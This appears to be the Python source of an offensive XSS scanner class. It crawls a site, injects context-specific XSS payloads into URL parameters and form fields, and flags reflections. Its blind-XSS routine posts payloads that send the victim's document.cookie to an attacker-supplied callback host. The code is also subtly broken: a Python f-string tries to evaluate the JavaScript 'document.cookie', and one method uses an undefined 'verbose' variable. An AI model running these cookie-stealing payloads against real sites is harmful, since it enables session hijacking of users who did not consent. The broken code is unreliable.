from scanner import Scanner
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, parse_qs, urlparse
from colorama import Fore, Style
import random

class XSSScanner(Scanner):
    def __init__(self):
        super().__init__()
        self.context_payloads = {
            'html': ['"><svg/onload=alert(1)>', '" autofocus onfocus=alert(1)'],
            'js': ['\';alert(1)//', '{{constructor.constructor(\'alert(1)\')()}}'],
            'attribute': [' onmouseover=alert(1)', ' style=animation-name:alert(1)']
        }

    def scan(self, url, crawl=False, check_dom=False, blind_callback=None, verbose=False, output_file=None):
        if crawl:
            for found_url in self.crawl(url):
                self._scan_single(found_url, check_dom, blind_callback, verbose, output_file)
        else:
            self._scan_single(url, check_dom, blind_callback, verbose, output_file)

    def _scan_single(self, url, check_dom, blind_callback, verbose, output_file):
        if check_dom:
            self._check_dom_xss(url)
            
        if blind_callback:
            self._test_blind_xss(url, blind_callback)
            
        self._test_reflected_xss(url, verbose, output_file)
        self._test_form_xss(url, verbose, output_file)

    def _check_dom_xss(self, url):
        try:
            res = self.session.get(url)
            dom_sinks = [
                ('document.write', 'Direct HTML Injection'),
                ('innerHTML', 'HTML Sink'),
                ('eval(', 'JS Execution'),
                ('location.hash', 'Hash Injection')
            ]
            
            for pattern, desc in dom_sinks:
                if pattern in res.text:
                    print(f"{Fore.MAGENTA}[!] DOM XSS ({desc}) detected at {url}{Style.RESET_ALL}")
                    
        except Exception as e:
            if verbose:
                print(f"{Fore.RED}[!] DOM check error: {e}{Style.RESET_ALL}")

    def _test_blind_xss(self, url, callback):
        payloads = [
            f'<script src="http://{callback}/c={escape(document.cookie)}"></script>',
            f'<img src=x onerror="fetch(\'http://{callback}/?data=\'+btoa(document.cookie))">'
        ]
        
        for payload in payloads:
            try:
                self.session.post(url, data={'input': payload}, timeout=3)
            except:
                pass

    def _test_reflected_xss(self, url, verbose, output_file):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param, values in params.items():
            for ctx, payloads in self.context_payloads.items():
                for payload in payloads:
                    test_url = self._build_test_url(parsed, param, payload)
                    
                    try:
                        res = self.session.get(test_url)
                        if self._is_payload_reflected(res.text, payload):
                            self._log_vulnerability(
                                f"Reflected XSS ({ctx}) in {param}",
                                test_url,
                                payload,
                                output_file
                            )
                    except Exception as e:
                        if verbose:
                            print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")

    def _test_form_xss(self, url, verbose, output_file):
        try:
            res = self.session.get(url)
            soup = BeautifulSoup(res.text, 'html.parser')
            
            for form in soup.find_all('form'):
                action = form.get('action', url)
                method = form.get('method', 'get').lower()
                inputs = form.find_all('input')
                
                for ctx, payloads in self.context_payloads.items():
                    for payload in payloads:
                        data = self._build_form_data(inputs, payload)
                        
                        try:
                            if method == 'post':
                                res = self.session.post(urljoin(url, action), data=data)
                            else:
                                res = self.session.get(urljoin(url, action), params=data)
                                
                            if self._is_payload_reflected(res.text, payload):
                                self._log_vulnerability(
                                    f"Form XSS ({ctx}) in {action}",
                                    url,
                                    payload,
                                    output_file
                                )
                        except Exception as e:
                            if verbose:
                                print(f"{Fore.RED}[!] Form error: {e}{Style.RESET_ALL}")

    def _build_test_url(self, parsed, param, payload):
        params = parse_qs(parsed.query)
        params[param] = [payload]
        return parsed._replace(query="&".join(f"{k}={v[0]}" for k,v in params.items())).geturl()

    def _build_form_data(self, inputs, payload):
        data = {}
        for input_tag in inputs:
            name = input_tag.get('name')
            if name:
                data[name] = payload if input_tag.get('type') in ('text', 'search') else input_tag.get('value', '')
        return data

    def _is_payload_reflected(self, response_text, payload):
        return payload in response_text

    def _log_vulnerability(self, title, url, payload, output_file):
        msg = f"{Fore.GREEN}[+] {title}{Style.RESET_ALL}\nURL: {url}\nPayload: {payload}\n"
        print(msg)
        
        if output_file:
            with open(output_file, 'a') as f:
                f.write(msg + "\n")
